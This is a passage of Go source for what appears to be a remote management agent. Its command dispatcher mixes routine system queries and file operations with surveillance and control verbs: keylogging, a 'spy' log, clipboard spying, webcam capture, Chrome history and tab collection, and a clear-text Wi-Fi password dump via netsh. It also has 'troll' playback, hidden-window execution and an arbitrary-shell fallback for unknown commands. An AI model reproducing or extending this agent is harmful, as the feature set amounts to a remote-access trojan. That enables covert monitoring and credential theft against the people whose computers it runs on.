package commands

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/load"
	"github.com/shirou/gopsutil/v3/mem"
	"rmm/internal/cmdlist"
	"rmm/internal/version"
)

// Exec timeouts: every shell-out is bounded so a hung command (ping -t,
// waiting prompt, huge output) can never wedge the agent.
const (
	shellTimeout   = 30 * time.Second
	quickTimeout   = 10 * time.Second
	maxOutputBytes = 1024 * 1024
)

// notImplemented lists KnownCommands with no dedicated handler yet.
// They return a clear message instead of falling through to cmd.exe and
// producing a confusing "'x' is not recognized" error.
// notImplemented is now empty: every KnownCommands entry has a handler.
// Kept (rather than deleted) so future stubs have a home and the Execute
// fallback below keeps its clear error message.
var notImplemented = map[string]bool{}

// runHidden runs a console tool with its window suppressed (see hideWindow).
func runHidden(ctx context.Context, name string, args ...string) ([]byte, error) {
	return hideWindow(exec.CommandContext(ctx, name, args...)).CombinedOutput()
}

func runWithTimeout(timeout time.Duration, name string, args ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	cmd := hideWindow(exec.CommandContext(ctx, name, args...))
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		return out, fmt.Errorf("timed out after %s", timeout)
	}
	return out, err
}

func truncateOut(out []byte) []byte {
	if len(out) > maxOutputBytes {
		return out[:maxOutputBytes]
	}
	return out
}

// psQuote single-quotes s for PowerShell (' -> '').
// cmdQuote double-quotes s for cmd.exe.
// NOTE: never use %q for shell paths — it emits Go-escaped \\ which
// cmd.exe and reg.exe reject ("The system cannot find the path specified").
func psQuote(s string) string  { return "'" + strings.ReplaceAll(s, "'", "''") + "'" }
func cmdQuote(s string) string { return `"` + s + `"` }

// KnownCommands aliases the shared catalog so existing callers keep working.
// The canonical map lives in internal/cmdlist (dependency-free, so the
// controller and mobile builds can import it without Windows packages).
var KnownCommands = cmdlist.Known

var (
	seenCmdsMu sync.Mutex
	seenCmds   = map[string]int64{} // cmd id -> unixnano (two-controller dedupe)
)

// ExecuteChecked runs a command unless its id already ran in the last
// minute (two controllers delivering the same command). Empty id always
// runs (old controllers). Suppressed calls return suppressed=true so the
// caller sends nothing instead of a confusing duplicate.
func ExecuteChecked(cmdID, cmd, args string) (result string, suppressed bool, err error) {
	// Critical mode commands must never be suppressed: retries need to
	// re-execute (idempotent) and mode changes must land even if the
	// first output was lost. Dedupe would make retries vanish.
	lowerCmd := strings.ToLower(strings.TrimSpace(cmd))
	if lowerCmd == "set-mode" || lowerCmd == "get-mode" {
		// bypass dedup entirely for mode path
	} else if cmdID != "" {
		now := time.Now().UnixNano()
		seenCmdsMu.Lock()
		if ts, ok := seenCmds[cmdID]; ok && now-ts < int64(time.Minute) {
			seenCmdsMu.Unlock()
			return "", true, nil
		}
		seenCmds[cmdID] = now
		if len(seenCmds) > 500 {
			for id, ts := range seenCmds {
				if now-ts > 2*int64(time.Minute) {
					delete(seenCmds, id)
				}
			}
		}
		seenCmdsMu.Unlock()
	}
	// Operation-mode gate (v1.42.3): restricted modes only run their
	// allowlist. Always-on verbs bypass so an agent can never lock out
	// set-mode (its only way back) or break ping/version health checks.
	switch strings.ToLower(strings.TrimSpace(cmd)) {
	case "ping", "version", "get-version", "get-mode", "set-mode":
	default:
		if m := AgentMode(); !modeAllows(m, cmd) {
			return "", false, fmt.Errorf("%s", ModeDenied(m))
		}
	}
	result, err = Execute(cmd, args)
	return result, false, err
}

// Execute runs a command and returns result string
func Execute(cmd, args string) (string, error) {
	cmd = strings.ToLower(strings.TrimSpace(cmd))
	args = strings.TrimSpace(args)

	// Split args by | for some commands, or comma, or space
	switch cmd {
	case "help":
		if args != "" {
			if desc, ok := KnownCommands[args]; ok {
				return fmt.Sprintf("%s: %s", args, desc), nil
			}
			return fmt.Sprintf("Unknown command: %s", args), nil
		}
		keys := make([]string, 0, len(KnownCommands))
		for k := range KnownCommands {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		var b bytes.Buffer
		for _, k := range keys {
			fmt.Fprintf(&b, "%-24s %s\n", k, KnownCommands[k])
		}
		return b.String(), nil
	case "list-commands":
		keys := make([]string, 0, len(KnownCommands))
		for k := range KnownCommands {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		return strings.Join(keys, "\n"), nil
	case "ping":
		return "pong", nil
	case "get-status":
		hn, _ := os.Hostname()
		return fmt.Sprintf("hostname=%s os=%s arch=%s go=%s version=%s", hn, runtime.GOOS, runtime.GOARCH, runtime.Version(), version.Version), nil
	case "get-version", "version":
		return VersionReport(), nil
	case "set-agent-token":
		return SetAgentToken(args)
	case "get-mode":
		return AgentMode(), nil
	case "agent-limits":
		return AgentLimitsCmd(args)
	case "set-mode":
		return SetAgentMode(args)
	case "get-spy-log":
		return getSpyLog(args)
	case "spy-clipboard":
		return SetSpyClipboard(args)
	case "get-hostname":
		hn, _ := os.Hostname()
		return hn, nil
	case "get-username":
		u := os.Getenv("USERNAME")
		if u == "" {
			u = os.Getenv("USER")
		}
		return u, nil
	case "get-os-version":
		if h, err := host.Info(); err == nil {
			return fmt.Sprintf("%s %s %s %s", h.Platform, h.PlatformVersion, h.KernelVersion, h.OS), nil
		}
		return fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH), nil
	case "get-system-info":
		return sysInfo()
	case "get-cpu-info":
		if infos, err := cpu.Info(); err == nil && len(infos) > 0 {
			j, _ := json.MarshalIndent(infos, "", "  ")
			return string(j), nil
		}
		return fmt.Sprintf("CPUs: %d", runtime.NumCPU()), nil
	case "get-cpu-usage":
		if percents, err := cpu.Percent(time.Second, false); err == nil && len(percents) > 0 {
			return fmt.Sprintf("%.1f%%", percents[0]), nil
		}
		return "unknown", nil
	case "get-memory-usage":
		if vm, err := mem.VirtualMemory(); err == nil {
			j, _ := json.MarshalIndent(vm, "", "  ")
			return string(j), nil
		}
		return "unknown", nil
	case "get-disk-usage":
		path := args
		if path == "" {
			path = "C:\\"
			if runtime.GOOS != "windows" {
				path = "/"
			}
		}
		if du, err := disk.Usage(path); err == nil {
			j, _ := json.MarshalIndent(du, "", "  ")
			return string(j), nil
		}
		return fmt.Sprintf("path: %s", path), nil
	case "get-disk-health":
		if runtime.GOOS == "windows" {
			return execPS("Get-PhysicalDisk | Select-Object FriendlyName,HealthStatus,OperationalStatus,Size | Format-Table -AutoSize")
		}
		return Execute("get-disk-usage", args)
	case "get-gpu-info":
		if runtime.GOOS == "windows" {
			return execPS("Get-CimInstance Win32_VideoController | Select-Object Name,DriverVersion,AdapterRAM,CurrentHorizontalResolution,CurrentVerticalResolution | Format-List")
		}
		return shellExec("lspci 2>/dev/null | grep -i vga || echo 'no lspci'")
	case "get-bios-info", "get-bios-version":
		if runtime.GOOS == "windows" {
			return execPS("Get-CimInstance Win32_BIOS | Select-Object Manufacturer,Name,Version,SerialNumber,ReleaseDate | Format-List")
		}
		return shellExec("dmidecode -t bios 2>/dev/null | head -30 || echo 'no dmidecode'")
	case "get-motherboard-info":
		if runtime.GOOS == "windows" {
			return execPS("Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer,Product,SerialNumber,Version | Format-List")
		}
		return shellExec("dmidecode -t baseboard 2>/dev/null | head -20 || echo 'no dmidecode'")
	case "get-ram-slots":
		if runtime.GOOS == "windows" {
			return execPS("Get-CimInstance Win32_PhysicalMemory | Select-Object BankLabel,Capacity,Speed,Manufacturer | Format-Table -AutoSize")
		}
		return shellExec("dmidecode -t memory 2>/dev/null | grep -E 'Size|Speed' | head -20 || free -h")
	case "get-battery", "get-battery-health":
		if runtime.GOOS == "windows" {
			return execPS("Get-CimInstance Win32_Battery | Select-Object Name,EstimatedChargeRemaining,EstimatedRunTime,BatteryStatus,DesignVoltage | Format-List")
		}
		return shellExec("upower -i /org/freedesktop/UPower/devices/battery_BAT0 2>/dev/null | head -20 || echo 'no battery info'")
	case "get-system-load":
		if avg, err := load.Avg(); err == nil {
			j, _ := json.MarshalIndent(avg, "", "  ")
			return string(j), nil
		}
		return "unknown", nil
	case "get-startup-programs":
		if runtime.GOOS == "windows" {
			return execPS("Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location | Format-Table -AutoSize")
		}
		return shellExec("ls ~/.config/autostart/ 2>/dev/null; systemctl list-unit-files --state=enabled 2>/dev/null | head -30")
	case "get-scheduled-tasks":
		if runtime.GOOS == "windows" {
			return execPS("Get-ScheduledTask | Select-Object TaskName,State | Select-Object -First 50 | Format-Table -AutoSize")
		}
		return shellExec("crontab -l 2>/dev/null; ls /etc/cron.d/ 2>/dev/null | head")
	case "get-user-groups", "list-groups":
		if runtime.GOOS == "windows" {
			return execPS("Get-LocalGroup | Select-Object Name,Description | Format-Table -AutoSize")
		}
		return shellExec("groups; echo ---; getent group | cut -d: -f1 | head -50")
	case "get-user-rights":
		if runtime.GOOS == "windows" {
			return shellExec("whoami /priv")
		}
		return shellExec("id")
	case "list-users":
		if runtime.GOOS == "windows" {
			return execPS("Get-LocalUser | Select-Object Name,Enabled,LastLogon | Format-Table -AutoSize")
		}
		return shellExec("getent passwd | cut -d: -f1")
	case "get-installed-updates":
		if runtime.GOOS == "windows" {
			return execPS("Get-HotFix | Select-Object HotFixID,Description,InstalledOn | Select-Object -First 50 | Format-Table -AutoSize")
		}
		return shellExec("dpkg -l 2>/dev/null | tail -30 || rpm -qa 2>/dev/null | tail -30 || echo 'unknown package manager'")
	case "get-pending-reboot":
		if runtime.GOOS == "windows" {
			return execPS("Test-Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\RebootPending'; Test-Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\\RebootRequired'")
		}
		return shellExec("test -f /var/run/reboot-required && echo 'reboot required' || echo 'no reboot required'")
	case "create-restore-point":
		if runtime.GOOS == "windows" {
			return execPS("Checkpoint-Computer -Description 'RMM' -RestorePointType 'MODIFY_SETTINGS'")
		}
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	case "get-uptime":
		if h, err := host.Info(); err == nil {
			d := time.Duration(h.Uptime) * time.Second
			return d.String(), nil
		}
		return "unknown", nil
	case "get-time":
		return time.Now().Format(time.RFC3339), nil
	case "get-timezone":
		name, _ := time.Now().Zone()
		return name, nil
	case "get-display-info", "get-display-resolution", "get-monitors", "get-screen-size":
		return getDisplayInfo()
	case "list-directory":
		return listDirectory(args)
	case "read-file":
		return readFile(args)
	case "write-file":
		return writeFile(args, false)
	case "append-file":
		return writeFile(args, true)
	case "prepend-file":
		return prependFile(args)
	case "edit-line":
		return editLine(args)
	case "delete-line":
		return deleteLine(args)
	case "insert-line":
		return insertLine(args)
	case "backup-file":
		return backupFile(args)
	case "compare-files":
		return compareFiles(args)
	case "compress-item":
		return compressItem(args)
	case "expand-item":
		return expandItem(args)
	case "get-file-version":
		return getFileVersion(args)
	case "run-script":
		return runScript(args)
	case "delete-item":
		return deleteItem(args)
	case "create-directory":
		if args == "" {
			return "", fmt.Errorf("path required")
		}
		return "", os.MkdirAll(args, 0755)
	case "copy-item":
		return copyItem(args)
	case "move-item":
		return moveItem(args)
	case "rename-item":
		return renameItem(args)
	case "get-file-info":
		return fileInfo(args)
	case "upload-status":
		return uploadStatus(args)
	case "get-file-hash":
		return fileHash(args)
	case "get-directory-size":
		return dirSize(args)
	case "search-files":
		return searchFiles(args)
	case "run-command":
		full := args
		if full == "" {
			full = cmd
		}
		// if called as run-command <cmd>, args is the cmd; if called directly, Cmd is the command
		if cmd == "run-command" {
			return shellExec(full)
		}
		return shellExec(cmd + " " + args)
	case "run-powershell":
		return execPS(args)
	case "launch-app":
		return launchApp(args)
	case "open-url":
		return openURL(args)
	case "get-ip-address":
		return getIPAddresses()
	case "get-network-info":
		return getNetworkInfo()
	case "get-network-connections":
		if runtime.GOOS == "windows" {
			return execPS("Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Select-Object -First 50 | Format-Table -AutoSize")
		}
		return shellExec("ss -tun 2>/dev/null | head -50 || netstat -tun 2>/dev/null | head -50")
	case "get-wifi-networks":
		if runtime.GOOS == "windows" {
			return shellExec("netsh wlan show networks")
		}
		return shellExec("nmcli dev wifi list 2>/dev/null | head -30 || echo 'no wifi tools'")
	case "get-wifi-profiles":
		if runtime.GOOS == "windows" {
			return shellExec("netsh wlan show profiles")
		}
		return shellExec("nmcli connection show 2>/dev/null | head -30 || echo 'no wifi tools'")
	case "get-wifi-password":
		if args == "" {
			return "", fmt.Errorf("usage: get-wifi-password <profile>")
		}
		if runtime.GOOS == "windows" {
			ctx, cancel := context.WithTimeout(context.Background(), quickTimeout)
			defer cancel()
			out, err := runHidden(ctx, "netsh", "wlan", "show", "profile", "name="+args, "key=clear")
			out = truncateOut(out)
			if err != nil {
				return string(out), err
			}
			return string(out), nil
		}
		return shellExec(fmt.Sprintf("nmcli -s connection show %q 2>/dev/null | grep -i psk || echo 'not found'", args))
	case "trace-route":
		if args == "" {
			return "", fmt.Errorf("usage: trace-route <host>")
		}
		if runtime.GOOS == "windows" {
			return shellExec("tracert -h 10 -w 500 " + args)
		}
		return shellExec("traceroute -m 10 -w 1 " + args + " 2>/dev/null || tracepath -m 10 " + args + " 2>/dev/null || echo 'no traceroute'")
	case "get-open-ports":
		if runtime.GOOS == "windows" {
			return execPS("Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess | Sort-Object LocalPort -Unique | Format-Table -AutoSize")
		}
		return shellExec("ss -tln 2>/dev/null | head -50 || netstat -tln 2>/dev/null | head -50")
	case "get-public-ip":
		return getPublicIP()
	case "resolve-dns":
		return resolveDNS(args)
	case "test-connection":
		return testConnection(args)
	case "check-port":
		return checkPort(args)
	case "flush-dns":
		_, _ = shellExec("ipconfig /flushdns")
		return "flushed", nil
	case "get-arp-cache":
		return shellExec("arp -a")
	case "get-route-table":
		if runtime.GOOS == "windows" {
			return shellExec("route print")
		}
		return shellExec("netstat -rn")
	case "mouse-move":
		return mouseMove(args)
	case "mouse-click":
		return mouseClick(args)
	case "mouse-doubleclick":
		return mouseDoubleClick()
	case "mouse-click-at":
		return mouseClickAt(args)
	case "mouse-doubleclick-at":
		return mouseDoubleClickAt(args)
	case "mouse-button":
		return mouseButton(args)
	case "mouse-scroll":
		return mouseScroll(args)
	case "get-position":
		x, y := getMousePos()
		return fmt.Sprintf("%d,%d", x, y), nil
	case "key-press":
		return keyPress(args)
	case "lock-screen":
		return lockScreen()
	case "minimize-all-windows":
		return minimizeAll()
	case "set-wallpaper":
		return setWallpaper(args)
	case "set-brightness":
		return setBrightness(args)
	case "set-volume", "set-audio-volume":
		return setAudioVolume(args)
	case "get-audio-volume":
		return getAudioVolume()
	case "get-audio-devices":
		return getAudioDevices()
	case "list-audio-endpoints":
		return listAudioEndpoints()
	case "get-audio-level":
		return getAudioLevel()
	case "set-mic-mute":
		return setMicMute(args)
	case "set-default-audio-device":
		return setDefaultAudioDevice(args)
	case "start-audio-stream":
		return StartAudioStream(args)
	case "stop-audio-stream":
		return StopAudioStream()
	case "force-update":
		// Runs controller-side (push-update button / interception). If it
		// ever reaches the agent directly, say so instead of falling
		// through to cmd.exe noise.
		return "", fmt.Errorf("force-update runs controller-side: use Controller v1.4.19+ push-update button or type force-update there")
	case "send-notification":
		return sendNotification(args)
	case "speak":
		return speak(args)
	case "speak-stop":
		return speakStop()
	case "play-troll":
		return playTroll(args)
	case "stop-troll":
		return stopTroll()
	case "troll-status":
		return trollStatus()
	case "troll-probe":
		return trollProbe(args)
	case "troll-selftest":
		return trollSelftest()
	case "camera-shot":
		return cameraShot(args)
	case "keep-awake":
		return keepAwake(args)
	case "get-session-state":
		return getSessionState()
	case "get-foreground-window":
		return getForegroundWindow()
	case "get-agent-log":
		return getAgentLog(args)
	case "get-agent-debug-log":
		return getAgentDebugLog(args)
	case "send-text":
		return sendText(args)
	case "keylog":
		return keylogCapture(args)
	case "clipboard-get":
		return clipboardGet()
	case "clipboard-set":
		return clipboardSet(args)
	case "get-active-window":
		return getActiveWindow()
	case "get-chrome-tabs":
		return chromeTabs()
	case "get-chrome-history":
		return chromeHistory(args)
	case "reg-read":
		return regRead(args)
	case "reg-write":
		return regWrite(args)
	case "reg-delete":
		return regDelete(args)
	case "reg-enum-keys":
		return regEnumKeys(args)
	case "reg-enum-values":
		return regEnumValues(args)
	case "reg-export":
		parts := strings.SplitN(args, "|", 2)
		if len(parts) != 2 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[1]) == "" {
			return "", fmt.Errorf("usage: reg-export <keypath>|<output.reg>")
		}
		if runtime.GOOS != "windows" {
			return "", fmt.Errorf("not supported on %s", runtime.GOOS)
		}
		ctx, cancel := context.WithTimeout(context.Background(), quickTimeout)
		defer cancel()
		out, err := runHidden(ctx, "reg", "export", strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]), "/y")
		out = truncateOut(out)
		if err != nil {
			return string(out), err
		}
		return string(out), nil
	case "wsl-execute":
		if strings.TrimSpace(args) == "" {
			return "", fmt.Errorf("usage: wsl-execute <command>")
		}
		if runtime.GOOS != "windows" {
			return shellExec(args)
		}
		return shellExec("wsl " + args)
	case "get-services":
		return getServices()
	case "get-processes":
		return getProcesses()
	case "get-installed-programs":
		return getInstalledPrograms()
	case "get-firewall-status":
		return shellExec("netsh advfirewall show allprofiles state")
	case "get-defender-status":
		return execPS("Get-MpComputerStatus | Format-List")
	case "get-defender-exclusions":
		return defenderExclusionsReport()
	case "get-go-version":
		return runtime.Version(), nil
	case "get-dotnet-version":
		return shellExec("dotnet --version")
	case "get-node-version":
		return shellExec("node --version")
	case "get-python-version":
		return shellExec("python --version")
	case "get-java-version":
		return shellExec("java -version")
	case "git-status", "git-log", "git-diff":
		if args == "" {
			args = "."
		}
		gitArgs := []string{"-C", args}
		switch cmd {
		case "git-status":
			gitArgs = append(gitArgs, "status")
		case "git-log":
			gitArgs = append(gitArgs, "log", "--oneline", "-20")
		case "git-diff":
			gitArgs = append(gitArgs, "diff", "--stat")
		}
		ctx, cancel := context.WithTimeout(context.Background(), quickTimeout)
		defer cancel()
		out, err := runHidden(ctx, "git", gitArgs...)
		out = truncateOut(out)
		if err != nil {
			return string(out), err
		}
		return string(out), nil
	case "shutdown-restart":
		return shutdownRestart(args)
	case "generate-password":
		return generatePassword()
	case "generate-uuid":
		return generateUUID()
	case "encode-base64":
		return encodeBase64(args), nil
	case "decode-base64":
		return decodeBase64(args)
	case "hash-text":
		h := sha256.Sum256([]byte(args))
		return hex.EncodeToString(h[:]), nil
	case "screenshot-now":
		return "use screenshot button", nil
	}

	// Known-but-unimplemented: clear message instead of confusing
	// "'x' is not recognized as an internal or external command".
	if notImplemented[cmd] {
		return "", fmt.Errorf("%s: not implemented in this agent version (see help)", cmd)
	}

	// Fallback: treat as shell command if unknown
	if cmd != "" {
		combined := cmd
		if args != "" {
			combined = cmd + " " + args
		}
		return shellExec(combined)
	}
	return "", fmt.Errorf("unknown command: %s", cmd)
}

// Helpers

func sysInfo() (string, error) {
	h, _ := host.Info()
	vm, _ := mem.VirtualMemory()
	ci, _ := cpu.Info()
	j := map[string]interface{}{
		"hostname": h.Hostname,
		"platform": h.Platform,
		"version":  h.PlatformVersion,
		"kernel":   h.KernelVersion,
		"uptime":   h.Uptime,
		"procs":    h.Procs,
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"go":       runtime.Version(),
		"cpus":     runtime.NumCPU(),
	}
	if vm != nil {
		j["memTotal"] = vm.Total
		j["memAvail"] = vm.Available
		j["memUsedPercent"] = vm.UsedPercent
	}
	if len(ci) > 0 {
		j["cpuModel"] = ci[0].ModelName
		j["cpuCores"] = ci[0].Cores
	}
	b, _ := json.MarshalIndent(j, "", "  ")
	return string(b), nil
}

func execPS(script string) (string, error) {
	return execPSPlatform(script)
}

func getDisplayInfo() (string, error) {
	if runtime.GOOS == "windows" {
		return execPS("Get-CimInstance Win32_VideoController | Select-Object Name,DriverVersion,CurrentHorizontalResolution,CurrentVerticalResolution | Format-List")
	}
	return fmt.Sprintf("GOOS=%s", runtime.GOOS), nil
}

func listDirectory(p string) (string, error) {
	if p == "" {
		p = "."
	}
	entries, err := os.ReadDir(p)
	if err != nil {
		return "", err
	}
	type FileEntry struct {
		Name         string `json:"name"`
		Size         int64  `json:"size"`
		IsDirectory  bool   `json:"isDirectory"`
		LastModified string `json:"lastModified"`
	}
	var out []FileEntry
	for _, e := range entries {
		info, _ := e.Info()
		var sz int64
		var mod string
		if info != nil {
			sz = info.Size()
			mod = info.ModTime().Format(time.RFC3339)
		}
		out = append(out, FileEntry{Name: e.Name(), Size: sz, IsDirectory: e.IsDir(), LastModified: mod})
	}
	b, _ := json.MarshalIndent(map[string]interface{}{"path": p, "entries": out}, "", "  ")
	return string(b), nil
}

func readFile(p string) (string, error) {
	if p == "" {
		return "", fmt.Errorf("path required")
	}
	f, err := os.Open(p)
	if err != nil {
		return "", err
	}
	defer f.Close()
	const limit = 512 * 1024
	data, err := io.ReadAll(io.LimitReader(f, limit+1))
	if err != nil {
		return "", err
	}
	if len(data) > limit {
		return string(data[:limit]) + "\n... truncated", nil
	}
	return string(data), nil
}

func writeFile(arg string, appendMode bool) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: write-file <path>|<content>")
	}
	path := strings.TrimSpace(parts[0])
	content := parts[1]
	flag := os.O_WRONLY | os.O_CREATE | os.O_TRUNC
	if appendMode {
		flag = os.O_WRONLY | os.O_CREATE | os.O_APPEND
	}
	f, err := os.OpenFile(path, flag, 0644)
	if err != nil {
		return "", err
	}
	defer f.Close()
	_, err = f.WriteString(content)
	return "", err
}

func deleteItem(p string) (string, error) {
	if p == "" {
		return "", fmt.Errorf("path required")
	}
	return "", os.RemoveAll(p)
}

func prependFile(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: prepend-file <path>|<content>")
	}
	path := strings.TrimSpace(parts[0])
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	old, err := io.ReadAll(io.LimitReader(f, 512*1024))
	f.Close()
	if err != nil {
		return "", err
	}
	if err := os.WriteFile(path, []byte(parts[1]+string(old)), 0644); err != nil {
		return "", err
	}
	return "", nil
}

func readLinesCapped(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 64*1024), 1024*1024)
	for sc.Scan() {
		lines = append(lines, sc.Text())
		if len(lines) > 100000 {
			return nil, fmt.Errorf("file exceeds 100000 lines")
		}
	}
	return lines, sc.Err()
}

func writeLines(path string, lines []string) error {
	var b strings.Builder
	for i, l := range lines {
		if i > 0 {
			b.WriteString("\n")
		}
		b.WriteString(l)
	}
	return os.WriteFile(path, []byte(b.String()), 0644)
}

func editLine(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 3)
	if len(parts) != 3 {
		return "", fmt.Errorf("usage: edit-line <path>|<linenum>|<newcontent>")
	}
	var n int
	if _, err := fmt.Sscanf(strings.TrimSpace(parts[1]), "%d", &n); err != nil || n < 1 {
		return "", fmt.Errorf("usage: edit-line <path>|<linenum>|<newcontent>")
	}
	lines, err := readLinesCapped(strings.TrimSpace(parts[0]))
	if err != nil {
		return "", err
	}
	if n > len(lines) {
		return "", fmt.Errorf("file has %d lines", len(lines))
	}
	lines[n-1] = parts[2]
	return "", writeLines(strings.TrimSpace(parts[0]), lines)
}

func deleteLine(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: delete-line <path>|<linenum>")
	}
	var n int
	if _, err := fmt.Sscanf(strings.TrimSpace(parts[1]), "%d", &n); err != nil || n < 1 {
		return "", fmt.Errorf("usage: delete-line <path>|<linenum>")
	}
	lines, err := readLinesCapped(strings.TrimSpace(parts[0]))
	if err != nil {
		return "", err
	}
	if n > len(lines) {
		return "", fmt.Errorf("file has %d lines", len(lines))
	}
	lines = append(lines[:n-1], lines[n:]...)
	return "", writeLines(strings.TrimSpace(parts[0]), lines)
}

func insertLine(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 3)
	if len(parts) != 3 {
		return "", fmt.Errorf("usage: insert-line <path>|<linenum>|<content>")
	}
	var n int
	if _, err := fmt.Sscanf(strings.TrimSpace(parts[1]), "%d", &n); err != nil || n < 1 {
		return "", fmt.Errorf("usage: insert-line <path>|<linenum>|<content>")
	}
	lines, err := readLinesCapped(strings.TrimSpace(parts[0]))
	if err != nil {
		return "", err
	}
	if n > len(lines)+1 {
		return "", fmt.Errorf("file has %d lines", len(lines))
	}
	lines = append(lines, "")
	copy(lines[n:], lines[n-1:])
	lines[n-1] = parts[2]
	return "", writeLines(strings.TrimSpace(parts[0]), lines)
}

func backupFile(p string) (string, error) {
	if p = strings.TrimSpace(p); p == "" {
		return "", fmt.Errorf("path required")
	}
	dst := p + ".bak-" + time.Now().Format("20060102-150405")
	in, err := os.Open(p)
	if err != nil {
		return "", err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
	if err != nil {
		return "", err
	}
	defer out.Close()
	if _, err := io.Copy(out, io.LimitReader(in, 256<<20)); err != nil {
		return "", err
	}
	return dst, nil
}

func compareFiles(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: compare-files <pathA>|<pathB>")
	}
	ha, err := fileHash(strings.TrimSpace(parts[0]))
	if err != nil {
		return "", fmt.Errorf("A: %w", err)
	}
	hb, err := fileHash(strings.TrimSpace(parts[1]))
	if err != nil {
		return "", fmt.Errorf("B: %w", err)
	}
	if ha == hb {
		return fmt.Sprintf("identical (sha256 %s)", ha), nil
	}
	return fmt.Sprintf("different\nA: %s\nB: %s", ha, hb), nil
}

func compressItem(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: compress-item <src>|<dst.zip>")
	}
	src, dst := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
	if runtime.GOOS == "windows" {
		return execPS(fmt.Sprintf("Compress-Archive -Path %s -DestinationPath %s -Force", psQuote(src), psQuote(dst)))
	}
	return shellExec(fmt.Sprintf("zip -r %q %q", dst, src))
}

func expandItem(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: expand-item <src.zip>|<dstDir>")
	}
	src, dst := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
	if runtime.GOOS == "windows" {
		return execPS(fmt.Sprintf("Expand-Archive -Path %s -DestinationPath %s -Force", psQuote(src), psQuote(dst)))
	}
	return shellExec(fmt.Sprintf("unzip -o %q -d %q", src, dst))
}

func getFileVersion(p string) (string, error) {
	if p = strings.TrimSpace(p); p == "" {
		return "", fmt.Errorf("path required")
	}
	if runtime.GOOS == "windows" {
		return execPS(fmt.Sprintf("(Get-Item %s).VersionInfo.FileVersion", psQuote(p)))
	}
	return shellExec(fmt.Sprintf("file %q", p))
}

func runScript(p string) (string, error) {
	if p = strings.TrimSpace(p); p == "" {
		return "", fmt.Errorf("path required")
	}
	// Direct exec with separate argv: quoting a path into a shell string
	// breaks under Go's Windows arg escaping (\" becomes literal).
	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
	defer cancel()
	run := func(name string, args ...string) (string, error) {
		out, err := runHidden(ctx, name, args...)
		out = truncateOut(out)
		if ctx.Err() == context.DeadlineExceeded {
			return string(out), fmt.Errorf("timed out after %s", shellTimeout)
		}
		return string(out), err
	}
	switch strings.ToLower(filepath.Ext(p)) {
	case ".ps1":
		return run("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", p)
	case ".bat", ".cmd":
		return run("cmd.exe", "/c", "call", p)
	case ".py":
		return run("python", p)
	case ".js":
		return run("node", p)
	default:
		return run(p)
	}
}

func copyItem(arg string) (string, error) {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("usage: copy-item <src>|<dst>")
	}
	src := strings.TrimSpace(parts[0])
	dst := strings.TrimSpace(parts[1])
	if st, err := os.Stat(src); err == nil && st.IsDir() {
		if runtime.GOOS == "windows" {
			// Direct exec (separate argv): embedding quotes in a shell
			// string breaks under Go's Windows arg escaping.
			ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
			defer cancel()
			out, err := runHidden(ctx, "xcopy", src, dst, "/E", "/I", "/Y")
			out = truncateOut(out)
			if err != nil {
				return string(out), err
			}
			return string(out), nil
		}
		return "", fmt.Errorf("copy-item: directories require windows xcopy")
	}
	const copyCap = 256 << 20 // 256 MB cap against OOM
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return "", err
	}
	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return "", err
	}
	defer out.Close()
	n, err := io.Copy(out, io.LimitReader(in, copyCap+1))
	if err != nil {
		return "", err
	}
	if n > copyCap {
